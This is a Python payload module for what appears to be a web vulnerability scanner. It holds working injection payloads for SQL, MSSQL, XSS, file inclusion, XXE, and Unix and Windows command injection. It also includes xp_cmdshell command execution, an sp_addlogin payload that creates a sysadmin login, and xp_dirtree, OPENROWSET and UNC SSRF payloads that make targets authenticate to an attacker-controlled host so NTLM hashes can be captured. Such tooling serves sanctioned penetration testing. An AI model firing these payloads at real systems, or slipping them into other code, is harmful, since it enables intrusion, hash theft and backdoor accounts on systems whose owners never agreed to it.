"""
payloads.py — Runtime loader for PayloadsAllTheThings payload files.

Lazy-loads .txt files from external/PayloadsAllTheThings/ on first access and
caches results in-process. All functions return list[str] with empty lines
stripped. Falls back to a minimal inline list when PAT is not present so the
tool still works without the submodule.

Update PAT:
    git -C external/PayloadsAllTheThings pull
"""

from pathlib import Path

_PAT_ROOT = Path(__file__).parent.parent / "external" / "PayloadsAllTheThings"
_CACHE: dict[str, list[str]] = {}


def _load(*path_parts: str) -> list[str]:
    key = "/".join(path_parts)
    if key not in _CACHE:
        p = _PAT_ROOT.joinpath(*path_parts)
        if p.exists():
            _CACHE[key] = [l for l in p.read_text(errors="ignore").splitlines() if l.strip()]
        else:
            _CACHE[key] = []
    return _CACHE[key]


def _load_multi(*file_specs: tuple) -> list[str]:
    """Concatenate multiple PAT files deduplicated."""
    seen: set[str] = set()
    out: list[str] = []
    for spec in file_specs:
        for line in _load(*spec):
            if line not in seen:
                seen.add(line)
                out.append(line)
    return out


def available() -> bool:
    return _PAT_ROOT.exists()


# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------

def sql_error() -> list[str]:
    return _load("SQL Injection", "Intruder", "Generic_ErrorBased.txt") or [
        "'", '"', "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
        " OR 1=1", " HAVING 1=1", "' AND 1=2--",
    ]


def sql_time() -> list[str]:
    return _load("SQL Injection", "Intruder", "Generic_TimeBased.txt") or [
        "' AND SLEEP(3)--", "\" AND SLEEP(3)--",
        "1; WAITFOR DELAY '0:0:3'--", "1 AND pg_sleep(3)--",
    ]


def sql_auth_bypass() -> list[str]:
    return _load_multi(
        ("SQL Injection", "Intruder", "Auth_Bypass.txt"),
        ("SQL Injection", "Intruder", "Auth_Bypass2.txt"),
    ) or ["' OR '1'='1", "' OR 1=1--", "admin'--", "' OR 1=1#"]


def sql_union() -> list[str]:
    return _load("SQL Injection", "Intruder", "Generic_UnionSelect.txt")


# ---------------------------------------------------------------------------
# XSS
# ---------------------------------------------------------------------------

def xss_quick() -> list[str]:
    return _load("XSS Injection", "Intruders", "xss_payloads_quick.txt") or [
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        '"><script>alert(1)</script>',
        "';alert(1)//",
    ]


def xss_full() -> list[str]:
    return _load("XSS Injection", "Intruders", "xss_alert.txt")


def xss_polyglots() -> list[str]:
    return _load("XSS Injection", "Intruders", "XSS_Polyglots.txt")


def xss_jhaddix() -> list[str]:
    return _load("XSS Injection", "Intruders", "JHADDIX_XSS.txt")


def xss_event_handlers() -> list[str]:
    return _load("XSS Injection", "Intruders", "0xcela_event_handlers.txt")


# ---------------------------------------------------------------------------
# LFI / Directory Traversal
# ---------------------------------------------------------------------------

def lfi_unix() -> list[str]:
    return _load("File Inclusion", "Intruders", "JHADDIX_LFI.txt") or [
        "../../../etc/passwd", "../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc//passwd",
        "php://filter/convert.base64-encode/resource=index.php",
    ]


def lfi_windows() -> list[str]:
    return _load("File Inclusion", "Intruders", "Windows-files.txt") or [
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "C:/boot.ini",
    ]


def lfi_linux() -> list[str]:
    return _load("File Inclusion", "Intruders", "Linux-files.txt")


def lfi_traversal() -> list[str]:
    return _load("Directory Traversal", "Intruder", "directory_traversal.txt") or [
        "../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252Fetc%252Fpasswd",
    ]


def lfi_traversal_deep() -> list[str]:
    return _load("Directory Traversal", "Intruder", "deep_traversal.txt")


def lfi_dotdotpwn() -> list[str]:
    return _load("Directory Traversal", "Intruder", "dotdotpwn.txt")


# ---------------------------------------------------------------------------
# Command Injection
# ---------------------------------------------------------------------------

def cmdi_exec() -> list[str]:
    return _load("Command Injection", "Intruder", "command_exec.txt") or [
        "; echo hxxpsin-$((1+1))",
        "| echo hxxpsin-$((1+1))",
        "$(echo hxxpsin-$((1+1)))",
        "`echo hxxpsin-$((1+1))`",
        "%0a echo hxxpsin-$((1+1))",
    ]


def cmdi_unix() -> list[str]:
    return _load("Command Injection", "Intruder", "command-execution-unix.txt") or [
        ";id;", "|id", "||id", "`id`", "$(id)",
    ]


# ---------------------------------------------------------------------------
# SSTI
# ---------------------------------------------------------------------------

def ssti_fuzz() -> list[str]:
    return _load("Server Side Template Injection", "Intruder", "ssti.fuzz") or [
        "{{7*7}}", "{{7*'7'}}", "${7*7}", "<%= 7*7 %>",
        "#{7*7}", "*{7*7}", "{7*7}", "${{7*7}}",
    ]


# ---------------------------------------------------------------------------
# XXE
# ---------------------------------------------------------------------------

def xxe_payloads() -> list[str]:
    return _load_multi(
        ("XXE Injection", "Intruders", "XXE_Fuzzing.txt"),
        ("XXE Injection", "Intruders", "xml-attacks.txt"),
    ) or [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    ]


# ---------------------------------------------------------------------------
# Open Redirect
# ---------------------------------------------------------------------------

def open_redirect() -> list[str]:
    return _load_multi(
        ("Open Redirect", "Intruder", "Open-Redirect-payloads.txt"),
        ("Open Redirect", "Intruder", "openredirects.txt"),
        ("Open Redirect", "Intruder", "open_redirect_wordlist.txt"),
    ) or [
        "//google.com", "//evil.com/%2f..", "https://evil.com",
        "javascript:alert(1)", "///google.com", "////google.com",
        "/\\evil.com", "%2f%2fevil.com",
    ]


# ---------------------------------------------------------------------------
# NoSQL Injection
# ---------------------------------------------------------------------------

def nosql_mongodb() -> list[str]:
    return _load("NoSQL Injection", "Intruder", "MongoDB.txt") or [
        "{ $ne: 1 }", "[$ne]=1", "{ $gt: '' }",
        "', $where: '1 == 1'", "|| 1==1",
    ]


def nosql_general() -> list[str]:
    return _load("NoSQL Injection", "Intruder", "NoSQL.txt") or [
        "true, $where: '1 == 1'", "{ $ne: 1 }",
        '{"$gt": ""}', "';sleep(5000);'",
    ]


# ---------------------------------------------------------------------------
# LDAP Injection
# ---------------------------------------------------------------------------

def ldap_fuzz() -> list[str]:
    return _load("LDAP Injection", "Intruder", "LDAP_FUZZ.txt") or [
        "*", "*)(&", "*))%00", "*()|%26'", "admin*",
        "*(|(objectclass=*))", "x' or name()='username' or 'x'='y",
    ]


def ldap_fuzz_small() -> list[str]:
    return _load("LDAP Injection", "Intruder", "LDAP_FUZZ_SMALL.txt")


def ldap_attrs() -> list[str]:
    return _load("LDAP Injection", "Intruder", "LDAP_attributes.txt") or [
        "cn", "uid", "mail", "userPassword", "objectClass",
        "ou", "dc", "sn", "givenName", "memberOf",
    ]


# ---------------------------------------------------------------------------
# CRLF Injection
# ---------------------------------------------------------------------------

def crlf_payloads() -> list[str]:
    return _load("CRLF Injection", "Files", "crlfinjection.txt") or [
        "%0d%0aSet-Cookie:crlf=injection",
        "%0aSet-Cookie:crlf=injection",
        "/%0d%0aSet-Cookie:crlf=injection",
        "%250aSet-Cookie:crlf=injection",
        "%u000aSet-Cookie:crlf=injection",
    ]


# ---------------------------------------------------------------------------
# SSI/ESI
# ---------------------------------------------------------------------------

def ssi_payloads() -> list[str]:
    return _load("Server Side Include Injection", "Files", "ssi_esi.txt") or [
        "<!--#exec cmd=\"id\" -->",
        "<!--#include virtual=\"/etc/passwd\" -->",
        "<esi:include src=\"http://evil.com/\"/>",
    ]


# ---------------------------------------------------------------------------
# Web Cache / Param Miner
# ---------------------------------------------------------------------------

def cache_headers() -> list[str]:
    return _load("Web Cache Deception", "Intruders", "param_miner_lowercase_headers.txt")


# ---------------------------------------------------------------------------
# Insecure Management Interface
# ---------------------------------------------------------------------------

def springboot_actuator() -> list[str]:
    return _load("Insecure Management Interface", "Intruder", "springboot_actuator.txt") or [
        "actuator", "actuator/health", "actuator/env",
        "actuator/heapdump", "actuator/shutdown", "actuator/mappings",
        "actuator/beans", "actuator/metrics", "actuator/loggers",
        "health", "env", "metrics", "heapdump", "shutdown",
    ]


# ---------------------------------------------------------------------------
# Windows command injection — cmd.exe and PowerShell
#
# Unix probes use ; | $() backticks; Windows accepts & && || ^ and inline
# powershell -c. Markers use Write-Host / echo so callers can grep response
# bodies the same way as the existing _CMD_ECHO_MARKER pattern.
# ---------------------------------------------------------------------------

def cmdi_windows(marker: str = "hxxpsin-w") -> list[tuple[str, str]]:
    """(payload, response_marker) tuples for Windows cmd.exe injection.
    Mirrors the shape of active_scanner._CMD_PROBES so callers can `extend`."""
    return [
        (f"& echo {marker}",                   marker),
        (f"&& echo {marker}",                  marker),
        (f"| echo {marker}",                   marker),
        (f"^| echo {marker}",                  marker),  # ^ escapes | inside cmd /c "..."
        (f"\" & echo {marker} & \"",           marker),  # quote-break inside C-style argv
        (f"%0a echo {marker}",                 marker),  # newline injection variant
    ]


def cmdi_windows_powershell(marker: str = "hxxpsin-ps") -> list[tuple[str, str]]:
    """PowerShell-flavored injection. Some Windows handlers route through
    PowerShell rather than cmd.exe (Web Deploy, IIS WebJobs, etc.)."""
    return [
        (f"; powershell -c \"Write-Host {marker}\"",            marker),
        (f"& powershell -c \"Write-Host {marker}\"",            marker),
        (f"| powershell -NoProfile -Command \"Write-Host {marker}\"", marker),
        (f"$(powershell -c 'Write-Host {marker}')",             marker),
    ]


def cmdi_windows_time() -> list[str]:
    """Time-based Windows command-injection — for the blind-injection timing
    path. ping -n is the most reliable cross-edition delay primitive on
    Windows; timeout /t is server-class only; Start-Sleep needs PowerShell."""
    return [
        "& ping -n 4 127.0.0.1",
        "&& ping -n 4 127.0.0.1",
        "| ping -n 4 127.0.0.1",
        "; ping -n 4 127.0.0.1",
        "& timeout /t 3 /nobreak",
        "& powershell -c \"Start-Sleep 3\"",
        "| powershell -c \"Start-Sleep 3\"",
    ]


# ---------------------------------------------------------------------------
# Microsoft SQL Server — dialect-specific SQL injection
#
# PAT ships FUZZDB-derived MSSQL payload files but the generic sql_*()
# functions don't load them. These pull the dialect-specific lists. Inline
# fallbacks are intentionally small — operators should clone PAT for full
# coverage.
# ---------------------------------------------------------------------------

def mssql_basic() -> list[str]:
    return _load("SQL Injection", "Intruder", "FUZZDB_MSSQL.txt") or [
        "' OR 1=1--",
        "'; SELECT @@version--",
        "'; SELECT name FROM sysobjects WHERE xtype='U'--",
    ]


def mssql_time() -> list[str]:
    return _load("SQL Injection", "Intruder", "FUZZDB_MSSQL-WHERE_Time.txt") or [
        "1; WAITFOR DELAY '0:0:3'--",
        "1' WAITFOR DELAY '0:0:3'--",
        "1); WAITFOR DELAY '0:0:3'--",
    ]


def mssql_enumeration() -> list[str]:
    return _load("SQL Injection", "Intruder", "FUZZDB_MSSQL_Enumeration.txt") or [
        "'; SELECT name FROM sysdatabases--",
        "'; SELECT name FROM sysobjects WHERE xtype='U'--",
        "'; SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')--",
    ]


def mssql_xp_cmdshell_safe() -> list[str]:
    """Non-destructive xp_cmdshell payloads — whoami / hostname only.
    Use when --allow-windows-destructive is OFF."""
    return [
        "'; EXEC xp_cmdshell 'whoami'--",
        "'; EXEC master..xp_cmdshell 'whoami'--",
        "'; EXEC xp_cmdshell 'hostname'--",
        "1); EXEC xp_cmdshell 'whoami'--",
    ]


def mssql_xp_cmdshell_destructive() -> list[str]:
    """Destructive xp_cmdshell payloads (file-listing, user/group enum).
    Use only when --allow-windows-destructive is ON."""
    return [
        "'; EXEC xp_cmdshell 'dir c:\\'--",
        "'; EXEC xp_cmdshell 'net user'--",
        "'; EXEC xp_cmdshell 'ipconfig /all'--",
        "'; EXEC xp_cmdshell 'systeminfo'--",
        "'; EXEC xp_cmdshell 'tasklist /v'--",
    ]


def mssql_xp_dirtree(canary_host: str, token: str) -> list[str]:
    """UNC NTLM-coercion via xp_dirtree. When MSSQL service account walks the
    UNC path it authenticates to the attacker SMB server with NTLMv2 — the
    sink at canary_host captures the hashcat -m 5600 hash. Token encoded in
    the share name so SMBSink can correlate the inbound auth to this probe."""
    base = f"\\\\{canary_host}\\{token}"
    return [
        f"'; EXEC xp_dirtree '{base}'--",
        f"'; EXEC master..xp_dirtree '{base}'--",
        f"'; EXEC xp_fileexist '{base}\\probe.txt'--",
        f"1); EXEC xp_dirtree '{base}'--",
        f"' UNION SELECT 1,2,(SELECT TOP 1 name FROM master..sysfiles)--",  # noisy enum tag-along
    ]


def mssql_openrowset(canary_host: str, token: str) -> list[str]:
    """OPENROWSET / OPENDATASOURCE coercion. Works on MSSQL editions where
    xp_dirtree is restricted but Ad Hoc Distributed Queries are allowed."""
    base = f"\\\\{canary_host}\\{token}"
    return [
        f"'; SELECT * FROM OPENROWSET('SQLNCLI','{base};Trusted_Connection=yes','SELECT 1')--",
        f"'; SELECT * FROM OPENDATASOURCE('SQLNCLI','Data Source={base};Integrated Security=SSPI')...sys.tables--",
        f"'; BULK INSERT t FROM '{base}\\probe.csv'--",
    ]


def mssql_sp_addlogin() -> list[str]:
    """DESTRUCTIVE — creates a new SQL login. Gated behind
    --allow-windows-destructive. Cleanup is the operator's responsibility."""
    return [
        "'; EXEC sp_addlogin 'hxxpsin', 'Hxxpsin!Probe-2026'--",
        "'; EXEC sp_addsrvrolemember 'hxxpsin','sysadmin'--",
    ]


# ---------------------------------------------------------------------------
# UNC / SMB / Windows-internal SSRF
#
# Windows clients (and many JVM HTTP clients on Windows) will dereference
# UNC paths in file:// and even http:// URLs. file://////host/share, the
# 5-slash variant, is the canonical SSRF→SMB pivot. WebDAV fallback via
# \\host@80\path lets us catch coercions inside an HTTP-only sink too.
# ---------------------------------------------------------------------------

def unc_ssrf_targets(canary_host: str, token: str) -> list[str]:
    """Canary-substituted UNC/SMB SSRF payloads. Pair with SMBSink for
    NTLM hash capture and PayloadServer for the WebDAV-fallback case."""
    return [
        f"\\\\{canary_host}\\{token}\\probe",
        f"\\\\{canary_host}@80\\{token}\\probe",           # WebDAV-over-HTTP fallback
        f"\\\\{canary_host}@SSL@443\\{token}\\probe",      # WebDAV-over-HTTPS
        f"\\\\?\\UNC\\{canary_host}\\{token}\\probe",
        f"file:////{canary_host}/{token}/probe",
        f"file://///{canary_host}/{token}/probe",
        f"file://{canary_host}/{token}/probe",
        f"http://{canary_host}/{token}",                   # HTTP fallback for the sink
        f"smb://{canary_host}/{token}/probe",              # libcurl + some JVM HTTP stacks
    ]


def windows_internal_ssrf_ports() -> list[tuple[int, str]]:
    """Ports worth probing on 127.0.0.1 / link-local from a Windows target.
    Each (port, service) drives one HEAD request through the SSRF param."""
    return [
        (5985,  "winrm"),         # WinRM HTTP
        (5986,  "winrm-tls"),     # WinRM HTTPS
        (47001, "wsman"),         # WS-Management v1
        (1433,  "mssql"),         # SQL Server TDS (raw — HEAD will fail loudly)
        (1434,  "mssql-browser"),
        (445,   "smb"),
        (139,   "netbios"),
        (3389,  "rdp"),
        (88,    "kerberos"),
        (636,   "ldaps"),
        (3268,  "global-catalog"),
        (3269,  "global-catalog-tls"),
        (5722,  "dfsr"),
        (9389,  "ad-ws"),         # Active Directory Web Services
    ]


# ---------------------------------------------------------------------------
# MSSQL error fingerprints — pattern set used to detect responses that
# leaked an SQL Server error. Reused by sql_probe and stackprint.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# AD-fronted web surfaces — ADFS, OWA, EWS, ActiveSync, SharePoint, etc.
# ---------------------------------------------------------------------------

_WORDLIST_ROOT = Path(__file__).parent / "wordlists"


def _load_wordlist(name: str) -> list[str]:
    """Load a hxxpsin-shipped wordlist (under src/wordlists/). Strips blank
    lines and #-prefixed comments."""
    key = f"wordlist:{name}"
    if key in _CACHE:
        return _CACHE[key]
    p = _WORDLIST_ROOT / name
    if not p.exists():
        _CACHE[key] = []
        return _CACHE[key]
    out: list[str] = []
    for line in p.read_text(errors="ignore").splitlines():
        s = line.strip()
        if s and not s.startswith("#"):
            out.append(s)
    _CACHE[key] = out
    return out


def adfs_owa_endpoints() -> list[str]:
    """AD-fronted web paths worth probing for NTLM/Negotiate auth challenges.
    Backed by src/wordlists/adfs-owa-paths.txt — the file form lets operators
    extend it without touching code. Inline fallback covers the 8 most
    discriminating paths."""
    return _load_wordlist("adfs-owa-paths.txt") or [
        "/owa/",
        "/EWS/Exchange.asmx",
        "/Autodiscover/Autodiscover.xml",
        "/Microsoft-Server-ActiveSync",
        "/adfs/ls/",
        "/adfs/services/trust/mex",
        "/RDWeb/",
        "/_layouts/15/Authenticate.aspx",
    ]


# ---------------------------------------------------------------------------
# MSSQL error fingerprints
# ---------------------------------------------------------------------------

def mssql_error_patterns() -> list[str]:
    return [
        r"Microsoft OLE DB Provider for SQL Server",
        r"SQL Server Native Client",
        r"\[SQL Server\]",
        r"Msg \d+, Level \d+, State \d+",
        r"System\.Data\.SqlClient\.SqlException",
        r"Microsoft SQL Native Client",
        r"OLE DB.*SQL Server",
        r"Incorrect syntax near",
        r"Unclosed quotation mark after the character string",
        r"Conversion failed when converting",
    ]
